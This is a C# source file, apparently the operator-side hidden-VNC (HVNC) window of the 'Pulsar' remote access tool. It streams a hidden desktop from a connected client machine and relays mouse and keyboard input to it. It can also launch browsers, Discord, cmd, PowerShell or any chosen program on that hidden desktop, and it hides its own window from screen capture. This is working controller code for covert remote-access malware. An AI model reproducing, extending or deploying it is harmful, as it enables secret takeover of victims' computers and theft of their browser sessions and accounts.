using Gma.System.MouseKeyHook;
using Pulsar.Common.Enums;
using Pulsar.Common.Helpers;
using Pulsar.Common.Messages;
using Pulsar.Server.Forms.DarkMode;
using Pulsar.Server.Helper;
using Pulsar.Server.Messages;
using Pulsar.Server.Networking;
using Pulsar.Server.Utilities;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Windows.Forms;
using System.Diagnostics;
using System.IO;
using Pulsar.Common.Messages.Monitoring.HVNC;

namespace Pulsar.Server.Forms
{
    public partial class FrmHVNC : Form
    {
        /// <summary>
        /// States whether remote mouse input is enabled.
        /// </summary>
        private bool _enableMouseInput;

        /// <summary>
        /// States whether remote keyboard input is enabled.
        /// </summary>
        private bool _enableKeyboardInput;

        /// <summary>
        /// A list of pressed keys for synchronization between key down & -up events.
        /// </summary>
        private readonly List<Keys> _keysPressed;

        /// <summary>
        /// The client which can be used for the HVNC.
        /// </summary>
        private readonly Client _connectClient;

        /// <summary>
        /// The message handler for handling the communication with the client.
        /// </summary>
        private readonly HVNCHandler _hVNCHandler;

        /// <summary>
        /// Stopwatch used to suppress FPS display during the initial seconds of the stream,
        /// preventing unstable or misleading values from being shown.
        /// </summary>
        private readonly Stopwatch _fpsDisplayStopwatch = Stopwatch.StartNew();

        /// <summary>
        /// Last frames per second value to show in the title bar.
        /// </summary>
        private float _lastFps = -1f;

        /// <summary>
        /// Holds the opened HVNC form for each client.
        /// </summary>
        private static readonly Dictionary<Client, FrmHVNC> OpenedForms = new Dictionary<Client, FrmHVNC>();

        private bool _useGPU = false;
        private const int UpdateInterval = 10;

        /// <summary>
        /// Creates a new HVNC form for the client or gets the current open form, if there exists one already.
        /// </summary>
        /// <param name="client">The client used for the HVNC form.</param>
        /// <returns>
        /// Returns a new HVNC form for the client if there is none currently open, otherwise creates a new one.
        /// </returns>
        public static FrmHVNC CreateNewOrGetExisting(Client client)
        {
            if (OpenedForms.ContainsKey(client))
            {
                return OpenedForms[client];
            }
            FrmHVNC r = new FrmHVNC(client);
            r.Disposed += (sender, args) => OpenedForms.Remove(client);
            OpenedForms.Add(client, r);
            return r;
        }

        /// <summary>
        /// Initializes a new instance of the <see cref="FrmHVNC"/> class using the given client.
        /// </summary>
        /// <param name="client">The client used for the HVNC form.</param>
        public FrmHVNC(Client client)
        {
            _connectClient = client;
            _hVNCHandler = new HVNCHandler(client);
            _keysPressed = new List<Keys>();

            RegisterMessageHandler();
            InitializeComponent();

            DarkModeManager.ApplyDarkMode(this);
            ScreenCaptureHider.ScreenCaptureHider.Apply(this.Handle);
        }

        /// <summary>
        /// Called whenever a client disconnects.
        /// </summary>
        /// <param name="client">The client which disconnected.</param>
        /// <param name="connected">True if the client connected, false if disconnected</param>
        private void ClientDisconnected(Client client, bool connected)
        {
            if (!connected)
            {
                this.Invoke((MethodInvoker)this.Close);
            }
        }

        /// <summary>
        /// Registers the HVNC message handler for client communication.
        /// </summary>
        private void RegisterMessageHandler()
        {
            _connectClient.ClientState += ClientDisconnected;
            _hVNCHandler.ProgressChanged += UpdateImage;
            MessageHandler.Register(_hVNCHandler);
        }

        /// <summary>
        /// Unregisters the HVNC message handler.
        /// </summary>
        private void UnregisterMessageHandler()
        {
            MessageHandler.Unregister(_hVNCHandler);
            _hVNCHandler.ProgressChanged -= UpdateImage;
            _connectClient.ClientState -= ClientDisconnected;
        }

        /// <summary>
        /// Subscribes to local mouse and keyboard events for HVNC input.
        /// </summary>
        private void SubscribeEvents()
        {
        }

        /// <summary>
        /// Unsubscribes from local mouse and keyboard events.
        /// </summary>
        private void UnsubscribeEvents()
        {
        }

        /// <summary>
        /// Starts the HVNC stream and begin to receive desktop frames.
        /// </summary>
        private void StartStream(bool useGPU)
        {
            ToggleConfigurationControls(true);

            picDesktop.addClient(_connectClient);
            picDesktop.Start();
            // Subscribe to the new frame counter.
            picDesktop.SetFrameUpdatedEvent(frameCounter_FrameUpdated);

            this.ActiveControl = picDesktop;

            _hVNCHandler.BeginReceiveFrames(barQuality.Value, cbMonitors.SelectedIndex, useGPU);
        }

        /// <summary>
        /// Stops the HVNC stream.
        /// </summary>
        private void StopStream()
        {
            ToggleConfigurationControls(false);

            picDesktop.Stop();
            // Unsubscribe from the frame counter. It will be re-created when starting again.
            picDesktop.UnsetFrameUpdatedEvent(frameCounter_FrameUpdated);

            this.ActiveControl = picDesktop;

            _hVNCHandler.EndReceiveFrames();
        }

        /// <summary>
        /// Toggles the activatability of configuration controls in the status/configuration panel.
        /// </summary>
        /// <param name="started">When set to <code>true</code> the configuration controls get enabled, otherwise they get disabled.</param>
        private void ToggleConfigurationControls(bool started)
        {
            btnStart.Enabled = !started;
            btnStop.Enabled = started;
            barQuality.Enabled = !started;
            cbMonitors.Enabled = !started;
        }

        /// <summary>
        /// Toggles the visibility of the status/configuration panel.
        /// </summary>
        /// <param name="visible">Decides if the panel should be visible.</param>
        private void TogglePanelVisibility(bool visible)
        {
            panelTop.Visible = visible;
            btnShow.Visible = !visible;
            this.ActiveControl = picDesktop;
        }

        /// <summary>
        /// Called whenever the remote displays changed.
        /// </summary>
        /// <param name="sender">The message handler which raised the event.</param>
        /// <param name="displays">The currently available displays.</param>
        private void DisplaysChanged(object sender, int displays)
        {
            cbMonitors.Items.Clear();
            for (int i = 0; i < displays; i++)
                cbMonitors.Items.Add($"Display {i + 1}");
            cbMonitors.SelectedIndex = 0;
        }

        /// <summary>
        /// Updates the current desktop image by drawing it to the desktop picturebox.
        /// </summary>
        /// <param name="sender">The message handler which raised the event.</param>
        /// <param name="bmp">The new desktop image to draw.</param>
        private Stopwatch _stopwatch = new Stopwatch();
        private int _frameCount = 0;

        private void UpdateImage(object sender, Bitmap bmp)
        {
            if (!_stopwatch.IsRunning)
            {
                _stopwatch.Start();
            }

            _frameCount++;

            double elapsedSeconds = _stopwatch.Elapsed.TotalSeconds;
            
            if (_hVNCHandler.CurrentFps > 0)
            {
                _lastFps = _hVNCHandler.CurrentFps;
            }

            if (elapsedSeconds >= 1.0)
            {
                _frameCount = 0;
                _stopwatch.Restart();
            }

            if (_frameCount >= UpdateInterval)
            {
                _frameCount = 0;

                long sizeInBytes = 0;
                using (MemoryStream ms = new MemoryStream())
                {
                    bmp.Save(ms, System.Drawing.Imaging.ImageFormat.Jpeg);
                    sizeInBytes = ms.Length;
                }
                double sizeInKB = sizeInBytes / 1024.0;

                this.Invoke((MethodInvoker)delegate
                {
                    sizeLabelCounter.Text = $"Size: {sizeInKB:0.00} KB";
                });
            }

            picDesktop.UpdateImage(bmp, false);
        }

        private void FrmHVNC_Load(object sender, EventArgs e)
        {
            this.Text = WindowHelper.GetWindowTitle("HVNC", _connectClient);

            OnResize(EventArgs.Empty); // trigger resize event to align controls 

            cbMonitors.SelectedIndex = 0;
        }
        
        /// <summary>
        /// Updates the title with the current frames per second.
        /// </summary>
        /// <param name="e">The new frames per second.</param>
        private void frameCounter_FrameUpdated(FrameUpdatedEventArgs e)
        {
            float fpsToShow;

            if (_fpsDisplayStopwatch.Elapsed.TotalSeconds < 2)
            {
                // Ignore the first 2 seconds to avoid showing fake FPS values
                fpsToShow = 0f;
            }
            else
            {
                float clientFps = _hVNCHandler.CurrentFps;
                fpsToShow = clientFps > 0f ? clientFps : ((_lastFps > 0f) ? _lastFps : e.CurrentFramesPerSecond);
            }

            this.Text = string.Format("{0} - FPS: {1:0.00}", WindowHelper.GetWindowTitle("HVNC", _connectClient), fpsToShow);
        }

        private void FrmHVNC_FormClosing(object sender, FormClosingEventArgs e)
        {
            // all cleanup logic goes here
            UnsubscribeEvents();
            if (_hVNCHandler.IsStarted) StopStream();
            UnregisterMessageHandler();
            _hVNCHandler.Dispose();
            picDesktop.Image?.Dispose();
        }

        private void FrmHVNC_Resize(object sender, EventArgs e)
        {
            if (WindowState == FormWindowState.Minimized)
                return;

            _hVNCHandler.LocalResolution = picDesktop.Size;
            btnShow.Left = (this.Width - btnShow.Width) / 2;
            btnShow.Top = this.Height - btnShow.Height - 40;
        }

        private void btnStart_Click(object sender, EventArgs e)
        {
            if (cbMonitors.Items.Count == 0)
            {
                MessageBox.Show("No remote display detected.\nPlease wait till the client sends a list with available displays.",
                    "Starting failed", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }

            SubscribeEvents();
            StartStream(_useGPU);
        }

        private void btnStop_Click(object sender, EventArgs e)
        {
            UnsubscribeEvents();
            StopStream();
        }

        #region HVNC Configuration

        private void barQuality_Scroll(object sender, EventArgs e)
        {
            int value = barQuality.Value;
            lblQualityShow.Text = value.ToString();

            if (value < 25)
                lblQualityShow.Text += " (low)";
            else if (value >= 85)
                lblQualityShow.Text += " (best)";
            else if (value >= 75)
                lblQualityShow.Text += " (high)";
            else if (value >= 25)
                lblQualityShow.Text += " (mid)";

            this.ActiveControl = picDesktop;
        }

        private void btnMouse_Click(object sender, EventArgs e)
        {
            if (_enableMouseInput)
            {
                this.picDesktop.Cursor = Cursors.Default;
                btnMouse.Image = Properties.Resources.mouse_delete;
                toolTipButtons.SetToolTip(btnMouse, "Enable mouse input.");
                _enableMouseInput = false;
            }
            else
            {
                this.picDesktop.Cursor = Cursors.Hand;
                btnMouse.Image = Properties.Resources.mouse_add;
                toolTipButtons.SetToolTip(btnMouse, "Disable mouse input.");
                _enableMouseInput = true;
            }

            this.ActiveControl = picDesktop;
        }

        private void btnKeyboard_Click(object sender, EventArgs e)
        {
            if (_enableKeyboardInput)
            {
                this.picDesktop.Cursor = Cursors.Default;
                btnKeyboard.Image = Properties.Resources.keyboard_delete;
                toolTipButtons.SetToolTip(btnKeyboard, "Enable keyboard input.");
                _enableKeyboardInput = false;
            }
            else
            {
                this.picDesktop.Cursor = Cursors.Hand;
                btnKeyboard.Image = Properties.Resources.keyboard_add;
                toolTipButtons.SetToolTip(btnKeyboard, "Disable keyboard input.");
                _enableKeyboardInput = true;
            }

            this.ActiveControl = picDesktop;
        }

        #endregion

        #region MenuItems
        private void menuItem1_Click(object sender, EventArgs e)
        {
            _connectClient.Send(new StartHVNCProcess
            {
                Application = "Explorer"
            });
        }

        private void menuItem2_Click(object sender, EventArgs e)
        {
            _connectClient.Send(new StartHVNCProcess
            {
                Application = "Chrome"
            });
        }

        private void startEdgeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            _connectClient.Send(new StartHVNCProcess
            {
                Application = "Edge"
            });
        }

        private void startBraveToolStripMenuItem_Click(object sender, EventArgs e)
        {
            _connectClient.Send(new StartHVNCProcess
            {
                Application = "Brave"
            });
        }

        private void startOperaToolStripMenuItem_Click(object sender, EventArgs e)
        {
            _connectClient.Send(new StartHVNCProcess
            {
                Application = "Opera"
            });
        }

        private void startOperaGXToolStripMenuItem_Click(object sender, EventArgs e)
        {
            _connectClient.Send(new StartHVNCProcess
            {
                Application = "OperaGX"
            });
        }

        private void startFirefoxToolStripMenuItem_Click(object sender, EventArgs e)
        {
            _connectClient.Send(new StartHVNCProcess
            {
                Application = "FireFox"
            });
        }

        private void startCmdToolStripMenuItem_Click(object sender, EventArgs e)
        {
            _connectClient.Send(new StartHVNCProcess
            {
                Application = "Cmd"
            });
        }

        private void startPowershellToolStripMenuItem_Click(object sender, EventArgs e)
        {
            _connectClient.Send(new StartHVNCProcess
            {
                Application = "Powershell"
            });
        }

        private void startCustomPathToolStripMenuItem_Click(object sender, EventArgs e)
        {
            FrmHVNCFileSelection fileSelectionForm = new FrmHVNCFileSelection(_connectClient);
            fileSelectionForm.ShowDialog();
        }

        #endregion

        private void btnHide_Click(object sender, EventArgs e)
        {
            TogglePanelVisibility(false);
        }

        private void btnShow_Click(object sender, EventArgs e)
        {
            TogglePanelVisibility(true);
        }

        private void startDiscordToolStripMenuItem_Click(object sender, EventArgs e)
        {
            _connectClient.Send(new StartHVNCProcess
            {
                Application = "Discord"
            });
        }
    }
}
